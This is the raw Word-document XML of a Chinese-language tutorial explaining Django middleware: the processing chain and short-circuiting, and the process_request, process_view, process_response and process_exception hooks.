    <w:p w14:paraId="07DE1081" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="519689DC" wp14:editId="1733AAC5">
            <wp:extent cx="4458882" cy="2157475"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="37" name="图片 37" descr="django整体架构图">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ango整体架构图">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82540" cy="2168922"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2BE958"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核心在于中间件</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所有的请求、返回都由中间件来完成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A3D5EC"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中间件，就是处理</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和</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的，类似插件，比如有</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中间件、</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中间件、</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w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件等，</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MIDDLEWARE_CLASSES </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的定义。大致的程序流程图如下所示：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50528970" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="342B05FC" wp14:editId="719153C9">
            <wp:extent cx="4582380" cy="3930315"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="38" name="图片 38" descr="整体流程">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整体流程">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12975" cy="3956556"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="096F6B34"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lastRenderedPageBreak/>
        <w:t>首先，</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MIDDLEWARE_CLASSES </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的定义，</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一个</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请求，将被这里指定的中间件从头到尾处理一遍，暂且称这些需要挨个处理的中间件为处理链，如果链中某个处理器处理后没有返回</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，就把请求传递给下一个处理器；如果链中某个处理器返回了</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，直接跳出处理链由</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中间件处理后返回给客户端，可以称之为短路处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12705162" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="t1"/>
      <w:bookmarkEnd w:id="55"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>二、</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>中间件中的方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EEC582"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处理一个</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的过程是首先通过中间件，然后再通过默认的</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方式进行的。我们可以在</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这个地方把所有</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拦截住，用我们自己的方式完成处理以后直接返回</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。因此了解中间件的构成是非常必要的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581C132C" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="30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Initializer: __init__(self)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48185E11"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出于性能的考虑，每个已启用的中间件在每个服务器进程中只初始化一次。也就是说</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仅在服务进程启动的时候调用，而在针对单个</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处理时并不执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DD9F45"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对一个</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而言，定义</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方法的通常原因是检查自身的必要性。如果</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抛出异常</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.exceptions.MiddlewareNotUsed ,</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>则</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将从</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栈中移出该</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763405E3"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在中间件中定义</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方法时，除了标准的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> self </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>参数之外，不应定义任何其它参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D2BDEA" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="30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Request</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>预处理函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: process_request(self, request)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CC9BF0"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这个方法的调用时机</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在Django接收到request之后，但仍未解析URL以确定应当运行的view之前</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向它传入相应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象，以便在方法中修改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B872F8A"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 xml:space="preserve">process_request() </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应当返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> None </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>或</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C378372"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None , Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将继续处理这个</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，执行后续的中间件，</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然后调用相应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>view.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BA7CBE"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 xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将不再执行任何其它的中间件</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无视其种类</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以及相应的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 xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将立即返回该</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75502DB5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="30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View</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>预处理函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: process_view(self, request, callback, callback_args, callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF66ACC"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这个方法的调用时机在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django执行完request预处理函数并确定待执行的view之后</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，但</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在view函数实际执行之前</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6BD945"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request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037AF8A6"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 xml:space="preserve">HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA19DD9"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callback</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16314163"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将调用的处理</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python</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>函数</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这是实际的函数对象本身</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而不是字符串表述的函数名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA6253D"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args</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBA293A" w14:textId="77777777" w:rsidR="00D8288D"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将传入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w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>位置参数列表</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，但不包括</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参数</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它通常是传入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的第一个参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52EF90CB" w14:textId="53F22675"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kwargs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B928A7F"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将传入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的关键字参数字典</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD8004E"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如同 process_request() , process_view() 应当返回 None 或 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9085D5"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None , Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将继续处理这个</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，执行后续的中间件，</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然后调用相应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6AF985"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 xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将不再执行</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任何</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其它的中间件</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不论种类</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以及相应的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将立即返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F3458D" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="32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Response</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>后处理函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: process_response(self, request, response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BFEAB8"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w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>调用时机在Django执行view函数并生成response之后</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9C6D09"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该处理器能修改response的内容</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；一个常见的用途是内容压缩，如</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>所请求的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350FC418"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这个方法的参数相当直观</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是</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对象，而</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> response </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>则是从</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中返回的</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对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E28DAF"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lastRenderedPageBreak/>
        <w:t>process_response() 必须 返回 HttpResponse 对象</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这个</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对象可以是传入函数的那一个原始对象</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通常已被修改</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，也可以是全新生成的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6662388E" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="32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Exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>后处理函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: process_exception(self, request, exception)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61209273"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w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>只有在request处理过程中出了问题并且view函数抛出了一个未捕获的异常时才会被调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这个钩子</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>可以用来发送错误通知，将现场相关信息输出到日志文件, 或者甚至尝试从错误中自动恢复</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
